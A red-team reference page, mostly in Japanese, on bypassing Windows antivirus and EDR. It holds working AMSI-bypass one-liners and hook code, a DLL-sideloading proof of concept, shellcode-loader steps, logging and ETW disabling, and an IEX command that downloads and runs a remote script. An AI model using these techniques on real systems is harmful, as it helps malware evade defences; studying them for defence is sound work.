# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって執筆されました！**

## Defenderを停止

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender の動作を停止させるツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を偽装して Windows Defender の動作を停止させるツール。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

現在、AV はファイルが悪意あるかどうかを判定するために、静的検出、動的解析、そしてより高度な EDR では振る舞い解析など、さまざまな方法を使用しています。

### **静的検出**

静的検出は、既知の悪意ある文字列やバイナリ中のバイト列をフラグ付けしたり、ファイル自体から情報を抽出することで行われます（例：file description、company name、digital signatures、icon、checksum など）。つまり、既知の公開ツールを使うと検出されやすくなる可能性があるということです。こうした検出を回避するにはいくつかの方法があります。

- **暗号化（Encryption）**

バイナリを暗号化すれば AV に検出されることはなくなりますが、メモリ上で復号して実行するための何らかのローダーが必要になります。

- **難読化（Obfuscation）**

単純にバイナリやスクリプト中の文字列を変更するだけで AV をすり抜けられる場合もありますが、対象によっては手間がかかることがあります。

- **カスタムツール（Custom tooling）**

独自ツールを開発すれば既知の悪性シグネチャは存在しませんが、多大な時間と労力が必要です。

> [!TIP]
> Windows Defender の静的検出を確認する良い方法の一つは [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) です。ファイルを複数のセグメントに分割して Defender に個別にスキャンさせることで、バイナリ中のどの文字列やバイトがフラグ化されているかを正確に教えてくれます。

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **動的解析（Dynamic analysis）**

動的解析は、AV がバイナリをサンドボックス上で実行し、悪意のある動作（例：ブラウザのパスワードを復号して読み取ろうとする、LSASS の minidump を取得する、など）を監視するものです。これは扱いがやや難しい部分ですが、サンドボックスを回避するためにできることはいくつかあります。

- **Sleep before execution** 実装によっては、実行前に長時間スリープさせることで AV の動的解析を回避できることがあります。AV はユーザーの作業を妨げないように短期間でファイルをスキャンする設計のため、長いスリープは解析を阻害します。ただし、多くの AV のサンドボックスは実装次第でスリープをスキップしてしまうことがあります。
- **Checking machine's resources** 通常、サンドボックスは利用可能なリソースが非常に少ない（例：< 2GB RAM）です。これを利用して判定することができます。さらに創造的に、CPU 温度やファン速度をチェックするなど、サンドボックスでは実装されていない可能性のある項目を確認する方法もあります。
- **Machine-specific checks** 対象が "contoso.local" ドメインに参加しているワークステーションであることを狙う場合、コンピュータのドメインをチェックして指定と一致しなければプログラムを終了させる、ということが可能です。

実際、Microsoft Defender の Sandbox の computername は HAL9TH であることが判明しているため、デプロイ前にマルウェア内でコンピュータ名をチェックして HAL9TH なら検出環境内と判断して終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes に対するいくつかの非常に有用なヒントは [@mgeeky](https://twitter.com/mariuszbit) から得られます。

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

前述の通り、**public tools** はいずれ **検出される**ことになるので、自問してみてください：

例えば、LSASS をダンプしたいとき、**do you really need to use mimikatz**? あるいは、あまり知られていない別のプロジェクトで同様に LSASS をダンプできないでしょうか。

正しい答えはおそらく後者です。mimikatz を例に取ると、それはおそらく AV や EDR に最も検出されるツールの一つであり、プロジェクト自体は非常に優れていますが、AV を回避する目的で扱うのは悪夢のような作業になり得ます。したがって、達成したい目的に対して代替を探すことを検討してください。

> [!TIP]
> ペイロードを回避用に修正する際は、Defender の自動サンプル送信（automatic sample submission）をオフにすることを忘れないでください。そして、真剣に言いますが、**DO NOT UPLOAD TO VIRUSTOTAL**。長期的に回避を目指すのであれば、ペイロードを VIRUSTOTAL にアップロードしないでください。特定の AV による検出状況を確認したい場合は、VM にその AV をインストールして自動サンプル送信をオフにし、そこで満足するまでテストしてください。

## EXEs vs DLLs

可能な限り、回避のためには常に **DLLs を優先して使用する** ことをお勧めします。経験上、DLL ファイルは通常 **検出や解析がかなり少ない** 傾向があり、ペイロードが DLL として実行できる場合は検出回避のための非常に簡単なトリックになります。

以下の画像のように、Havoc の DLL ペイロードは antiscan.me での検出率が 4/26 であるのに対し、EXE ペイロードは 7/26 の検出率でした。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

ここからは、DLL ファイルを使ってよりステルス性を高めるためのいくつかのトリックを紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** はローダーの DLL 検索順序を悪用し、被害者アプリケーションと悪意のあるペイロードを同じ場所に置くことで成立します。

[Siofra](https://github.com/Cybereason/siofra) と以下の powershell スクリプトを使って、DLL Sideloading の影響を受けやすいプログラムをチェックできます。
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは "C:\Program Files\\" 内で DLL hijacking の影響を受けやすいプログラムと、それらがロードしようとする DLL ファイルの一覧を出力します。

私は **explore DLL Hijackable/Sideloadable programs yourself** を強く推奨します。この手法は適切に行えばかなりステルス性がありますが、公開されている既知の DLL Sideloadable プログラムを使うと簡単に見つかる可能性があります。

プログラムがロードすることを期待する名前の悪意ある DLL を置いただけでは、必ずしもペイロードが実行されません。プログラムはその DLL 内に特定の関数を期待しているためです。この問題を解決するために、**DLL Proxying/Forwarding** という別の手法を使います。

**DLL Proxying** は、プログラムが行う呼び出しを proxy (and malicious) DLL から元の DLL に転送します。これによりプログラムの機能を維持しつつ、ペイロードの実行を扱うことができます。

私は [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを [@flangvik](https://twitter.com/Flangvik/) から使用します。

以下が私が実行した手順です:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドは次の2つのファイルを生成します: DLLのソースコードテンプレートと、リネームされた元のDLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **強くおすすめします**：DLL Sideloading についての [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) と [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) をぜひご覧になり、本稿で議論した内容をより深く学んでください。

### Forwarded Exports (ForwardSideLoading) の悪用

Windows の PE モジュールは、実際には "forwarders" である関数をエクスポートすることがあります。エクスポートエントリはコードを指す代わりに `TargetDll.TargetFunc` の形式の ASCII 文字列を含みます。呼び出し側がそのエクスポートを解決すると、Windows ローダーは次を行います：

- `TargetDll` がまだロードされていない場合はロードする
- そこから `TargetFunc` を解決する

理解すべき主な挙動：
- `TargetDll` が KnownDLL の場合、それは保護された KnownDLLs 名前空間（例: ntdll, kernelbase, ole32）から提供される。
- `TargetDll` が KnownDLL でない場合、通常の DLL 検索順序が使用され、forward 解決を行っているモジュールのディレクトリが含まれる。

これにより間接的な sideloading プリミティブが可能になります：関数を KnownDLL でないモジュール名へフォワードしている signed DLL を見つけ、その signed DLL を攻撃者が制御する DLL（フォワード先モジュール名と正確に同じ名前）と同じ場所に置きます。フォワードされたエクスポートが呼び出されると、ローダーはフォワードを解決し、同じディレクトリからあなたの DLL をロードして DllMain を実行します。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC (コピペ):
1) 署名されたシステムDLLを書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を配置します。最小限の `DllMain` があればコード実行は可能で、DllMain をトリガーするために forwarded function を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名された LOLBin でフォワードをトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (署名済み) はサイドバイサイドの `keyiso.dll` (署名済み) を読み込む
- `KeyIsoSetAuditingInterface` を解決する際、ローダーはフォワードを辿って `NCRYPTPROV.SetAuditingInterface` を参照する
- その後ローダーは `C:\test` から `NCRYPTPROV.dll` を読み込み、その `DllMain` を実行する
- もし `SetAuditingInterface` が実装されていない場合、`DllMain` 実行後にのみ "missing API" エラーが発生する

Hunting tips:
- ターゲットモジュールが KnownDLL でないフォワードされたエクスポートに注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` の下に列挙されている。
- フォワードされたエクスポートは、例えば次のようなツールで列挙できる：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を探すには Windows 11 の forwarder インベントリを参照: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins (e.g., rundll32.exe) が非システムパスから署名済み DLL を読み込み、そのディレクトリから同じベース名の non-KnownDLLs を読み込む挙動を監視する
- 次のようなプロセス／モジュールの連鎖にアラートを出す: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの write+execute を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使って shellcode をステルスな方法でロードして実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 回避はいたちごっこに過ぎません。今日有効でも明日検出される可能性があるため、単一のツールだけに頼らず、可能であれば複数の回避手法を組み合わせてください。

## AMSI (Anti-Malware Scan Interface)

AMSIは"[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"を防ぐために作られました。最初、AVは**ディスク上のファイル**のみをスキャンできたため、ペイロードを**メモリ内で直接**実行できれば、AVは十分な可視性を持たず防止できませんでした。

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

スクリプトの内容を暗号化や難読化されていない形で露出させることで、アンチウイルスがスクリプトの挙動を検査できるようにします。

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

先頭に `amsi:` が付加され、その後にスクリプトを実行した実行ファイルのパス（この場合は powershell.exe）が続いている点に注意してください。

ファイルをディスクに置いていないにもかかわらず、AMSIのためにメモリ内で検出されてしまいました。

さらに、starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

AMSIを回避する方法はいくつかあります：

- **Obfuscation**

  AMSIは主に静的検出で動作するため、読み込もうとするスクリプトを修正することは検出を回避するための有効な手段になり得ます。

  しかし、AMSIは複数層の難読化であってもスクリプトを元に戻す能力を持っているため、難読化はやり方次第では有効でないことがあります。そのため、回避は必ずしも単純ではありません。とはいえ、場合によっては変数名をいくつか変えるだけで十分なこともあるので、どれだけ検出されているかによります。

- **AMSI Bypass**

  AMSIはDLLをpowershell（およびcscript.exe、wscript.exeなど）のプロセスにロードすることで実装されているため、特権のないユーザーとして実行している場合でも簡単に改ざんすることが可能です。このAMSIの実装上の欠陥により、研究者たちはAMSIスキャンを回避するさまざまな手法を発見しました。

**Forcing an Error**

AMSIの初期化を失敗させる（amsiInitFailed）と、そのプロセスではスキャンが開始されなくなります。これは元々 [Matt Graeber](https://twitter.com/mattifestation) によって公開され、Microsoftはその広範な利用を防ぐためのシグネチャを作成しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell プロセスに対して AMSI を無効化するのに必要だったのは、powershell コードの1行だけだった。  
この1行は当然ながら AMSI 自身によって検出されるため、この手法を利用するにはいくつかの修正が必要だ。

こちらはこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取ってきた修正済みの AMSI bypass だ。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
この記事が公開されるとおそらくフラグが立つことに注意してください。検出を避けたいならコードを公開すべきではありません。

**Memory Patching**

この手法は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。ユーザが提供した入力をスキャンする役割を持つ "AmsiScanBuffer" 関数のアドレスを amsi.dll から特定し、それを E_INVALIDARG を返す命令で上書きします。こうすることで実際のスキャン結果は 0 を返し、クリーンと解釈されます。

> [!TIP]
> 詳細な説明は [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) を参照してください。

powershell で AMSI をバイパスする他の多くの手法もあります。詳細は [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を確認してください。

### amsi.dll の読み込みを阻止して AMSI をブロックする（LdrLoadDll hook）

AMSI は現在のプロセスに `amsi.dll` がロードされた後にのみ初期化されます。言語に依存しない堅牢なバイパスとしては、要求されたモジュールが `amsi.dll` のときにエラーを返すように `ntdll!LdrLoadDll` にユーザーモードフックを配置する方法があります。その結果、AMSI はロードされず、そのプロセスではスキャンが行われません。

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意
- PowerShell、WScript/CScript、カスタムローダーなど、AMSI を読み込むあらゆる環境で動作します（AMSI を読み込むものなら何でも）。
- 長いコマンドラインの痕跡を避けるため、stdin 経由でスクリプトを渡す（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせて使用してください。
- LOLBins 経由で実行されるローダー（例：`regsvr32` が `DllRegisterServer` を呼ぶケース）で使われているのが確認されています。

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**検出されたシグネチャを削除する**

現在のプロセスのメモリから検出された AMSI シグネチャを削除するには、**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のようなツールを使用できます。これらのツールは、現在のプロセスのメモリをスキャンして AMSI シグネチャを検出し、NOP 命令で上書きしてメモリから実質的に削除します。

**AMSI を使用する AV/EDR 製品**

AMSI を使用する AV/EDR 製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell バージョン 2 を使用する**
PowerShell バージョン 2 を使用すると AMSI は読み込まれないため、スクリプトは AMSI によるスキャンを受けずに実行できます。次のように実行します:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドを記録できる機能です。監査やトラブルシューティングに有用ですが、検出を回避しようとする攻撃者にとっては重大な問題になり得ます。

PowerShell logging を回避するには、次の手法を使用します:

- **Disable PowerShell Transcription and Module Logging**: この目的には [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
- **Use Powershell version 2**: PowerShell version 2 を使用すると AMSI がロードされないため、AMSI によるスキャンを受けずにスクリプトを実行できます。実行例: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 防御機構のない powershell セッションを生成するには [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使用します（これは Cobalt Strike の `powerpick` が使用する方法です）。


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2（または商用フォーク）を用いたマルウェアを解析する際、デコンパイラやサンドボックスを阻害する複数の保護レイヤに遭遇することがよくあります。以下のワークフローは、元に近い IL を確実に復元し、その後 dnSpy や ILSpy などのツールで C# にデコンパイルできる状態にします。

1.  Anti-tampering removal – ConfuserEx はすべての *method body* を暗号化し、*module* の static constructor (`<Module>.cctor`) 内で復号します。これにより PE チェックサムもパッチされ、変更するとバイナリがクラッシュします。**AntiTamperKiller** を使って暗号化されたメタデータテーブルを特定し、XOR キーを回収してクリーンなアセンブリを書き換えます:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には、独自のアンパッカーを構築する際に有用な 6 つのアンチタンパーパラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれます。

2.  Symbol / control-flow recovery – *clean* ファイルを **de4dot-cex**（de4dot の ConfuserEx 対応フォーク）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 プロファイルを選択  
• de4dot は制御フローのフラット化を元に戻し、元の名前空間、クラス、変数名を復元し、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserEx はデコンパイルをさらに難しくするために直接のメソッド呼び出しを軽量なラッパー（別名 *proxy calls*）に置き換えます。**ProxyCall-Remover** でこれらを除去します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
このステップの後、曖昧なラッパー関数（`Class8.smethod_10`, …）の代わりに `Convert.FromBase64String` や `AES.Create()` といった通常の .NET API が見えるはずです。

4.  Manual clean-up – 生成されたバイナリを dnSpy で開き、大きな Base64 ブロブや `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用を検索して *実際の* ペイロードを特定します。多くの場合、マルウェアはそれを `<Module>.byte_0` 内で初期化された TLV エンコードされたバイト配列として格納しています。

上記のチェーンは、悪意あるサンプルを実行することなく実行フローを復元します — オフラインのワークステーションで作業する際に有用です。

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) と改ざん防止を通じてソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は、外部ツールを使用したりコンパイラを変更したりすることなく、`C++11/14` 言語を使ってコンパイル時に obfuscated code を生成する方法を示しています。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework によって生成される obfuscated operations のレイヤーを追加し、アプリケーションの解析を試みる人の作業を少しだけ困難にします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は x64 binary obfuscator で、.exe、.dll、.sys を含むさまざまな pe files を obfuscate できます。
- [**metame**](https://github.com/a0rtega/metame): Metame は arbitrary executables 向けの simple metamorphic code engine です。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は ROP (return-oriented programming) を使う、LLVM-supported languages 向けの細粒度な code obfuscation framework です。ROPfuscator は通常の命令を ROP chains に変換することで、アセンブリコードレベルでプログラムを obfuscate し、通常の制御フローに対する直感的な理解を阻害します。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換してロードすることができます

## SmartScreen & MoTW

インターネットからいくつかの実行ファイルをダウンロードして実行したときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreen は、エンドユーザが潜在的に悪意のあるアプリケーションを実行することから守ることを目的としたセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen は主にレピュテーションベースの方式で動作します。つまり、あまりダウンロードされていないアプリケーションは SmartScreen をトリガーし、エンドユーザに対してファイルの実行を警告・阻止します（ただしファイルは More Info -> Run anyway をクリックすることで実行可能です）。

**MoTW** (Mark of The Web) は Zone.Identifier という名前の [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) で、インターネットからファイルをダウンロードすると、そのダウンロード元の URL とともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認している様子。</p></figcaption></figure>

> [!TIP]
> 実行ファイルが **trusted** signing certificate で署名されていると、**won't trigger SmartScreen** という点に注意してください。

payload が Mark of The Web を付与されるのを防ぐ非常に効果的な方法は、ISO のようなコンテナにパッケージングすることです。これは Mark-of-the-Web (MOTW) が **non NTFS** ボリュームには **cannot** 適用されないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、payload を出力コンテナに梱包して Mark-of-the-Web を回避するツールです。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントがイベントを記録（log events）するための強力な Windows のロギング機構です。しかし、セキュリティ製品が悪意ある活動を監視・検出するために利用することもあります。

AMSI を無効化（バイパス）するのと同様に、ユーザ空間プロセスの **`EtwEventWrite`** 関数をイベントを記録せずに即座に戻すようにすることも可能です。これはメモリ上で関数を書き換えて即時リターンさせることで行われ、そのプロセスの ETW ロギングを事実上無効化します。

詳細は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。


## C# Assembly Reflection

C# バイナリをメモリ上にロードして実行する手法は以前から知られており、AV に検出されずにポストエクスプロイトツールを実行する非常に有効な方法のままです。

ペイロードがディスクに触れず直接メモリにロードされるため、プロセス全体に対して AMSI をパッチすることだけを気にすれば良くなります。

ほとんどの C2 フレームワーク（sliver, Covenant, metasploit, CobaltStrike, Havoc など）は既に C# アセンブリをメモリ上で直接実行する機能を提供していますが、実行方法にはいくつかのアプローチがあります:

- **Fork\&Run**

これは **新しい犠牲プロセスを生成（spawn）** し、その新プロセスにポストエクスプロイトの悪意あるコードを注入して実行し、終了したらそのプロセスを殺す、という方法です。利点と欠点があります。利点は実行が Beacon インプラントプロセスの**外部**で行われるため、ポストエクスプロイト操作で何か問題が起きてもインプラントが生き残る**可能性が高い**点です。欠点は、**Behavioural Detections** により検出される確率が**高くなる**点です。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これはポストエクスプロイトの悪意あるコードを**自身のプロセス内に注入**する方法です。新しいプロセスを作成して AV にスキャンされるのを回避できますが、ペイロード実行時に問題が起きるとプロセスがクラッシュして Beacon を失う**可能性が高い**という欠点があります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly のロードについてさらに読みたい場合はこの記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と彼らの InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を参照してください。

PowerShell からの C# Assembly ロードも可能です。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と S3cur3th1sSh1t のビデオ（https://www.youtube.com/watch?v=oe11Q-3Akuk）もチェックしてください。

## Using Other Programming Languages

[https://github.com/deeexcee-io/LOI-Bins](https://github.com/deeexcee-io/LOI-Bins) にあるように、被害マシンに Attacker Controlled SMB share 上にあるインタプリタ環境へのアクセスを与えることで、他言語を使って悪意あるコードを実行することが可能です。

SMB share 上のインタプリタ実行ファイルや環境へアクセスを許可することで、被害マシンのメモリ内でこれらの言語のコードを**任意に実行**できます。

リポジトリには「Defender はスクリプトをスキャンし続けるが、Go, Java, PHP 等を利用することで **静的シグネチャをバイパスする柔軟性が高まる**」と記載されています。これらの言語でランダムな非難号化の reverse shell スクリプトをテストしたところ成功しています。

## TokenStomping

Token stomping は、攻撃者が **アクセス トークンや EDR や AV のようなセキュリティ製品を操作** して、その権限を低下させることでプロセスが終了しないようにしつつ、悪意ある活動をチェックする権限を持たせないようにする手法です。

これを防ぐために、Windows はセキュリティプロセスのトークンに対して外部プロセスがハンドルを取得することを**禁止**するようにすることができます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
